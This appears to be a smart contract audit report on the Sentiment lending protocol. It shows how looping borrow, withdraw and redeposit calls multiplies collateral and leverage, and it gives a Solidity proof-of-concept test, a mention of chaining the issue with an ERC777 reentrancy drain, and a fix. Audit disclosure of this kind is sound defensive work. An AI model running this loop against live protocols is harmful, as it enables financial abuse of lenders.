Tutturu
# Multiply collateral via a borrow and deposit loop

## Summary
A user can borrow multiple times more than expected by withdrawing and redepositing the borrowed asset as collateral.

## Vulnerability Detail
The protocol does not forbid the user from withdrawing their borrowed assets as long as the safety factor is above 1.2e18. This means that a user can deposit collateral, borrow a smaller amount of funds reducing their safety score, and then redeposit those borrowed assets to increase their safety score. This action can be repeated until the user reaches the desired safety score, and then they can leverage their collateral in one of the supported protocols.

## Impact
Although this vulnerability does not directly lead to loss of funds it still demonstrates an unexpected way of abusing the borrow and withdraw flow, leading to users multiplying their leveregable assets by up to 4 times.

Additionally, this vulnerability could be combined with the previous issue I submitted that drains the collateral and borrow via the ERC777 tokensReceived() hook, by building up ETH collateral with the withdrawn borrowed assets, and then withdrawing the collateral at the end of sweepTo().

## Code Snippet

```solidity
function testMultiBorrow() public {
	// Setup
	uint96 depositAmt = 100 ether;
	uint96 borrowAmt = 20 ether;
	uint256 tokenPoolAmount = 10000 ether;
	uint256 totalDeposit = uint256(depositAmt);
	uint256 totalBorrow = uint256(borrowAmt);

	deposit(owner, account, address(erc20), depositAmt);

	erc20.mint(registry.LTokenFor(address(erc20)), tokenPoolAmount);

	cheats.startPrank(owner);

	// Arbitrary number of iterations, just to showcase we are borrowing more than we should be able to
	for (uint256 i; i < 19; i++) {

		accountManager.borrow(account, address(erc20), borrowAmt);

		accountManager.withdraw(account, address(erc20), borrowAmt);

		accountManager.deposit(account, address(erc20), borrowAmt);

		totalDeposit += borrowAmt;

		totalBorrow += i == 0 ? 0 : borrowAmt;

}
	cheats.stopPrank();

	console.log("totalDeposit", totalDeposit);
	console.log("totalBorrow", totalBorrow);
	console.log("Account balance", erc20.balanceOf(account));

	require(totalDeposit > depositAmt, "Deposit correctly limited");

}
```

Affected functions:
Deposit and withdraw: [AccountManager.sol#L183-L217](https://github.com/sherlock-audit/2022-08-sentiment-tuturu-tech/blob/518b6d4f8caaffd4cd2c2f4483b11170dccbdeeb/protocol/src/core/AccountManager.sol#L183-L217)

## Tool used

Manual Review

## Recommendation

Disallow withdrawing borrowed assets.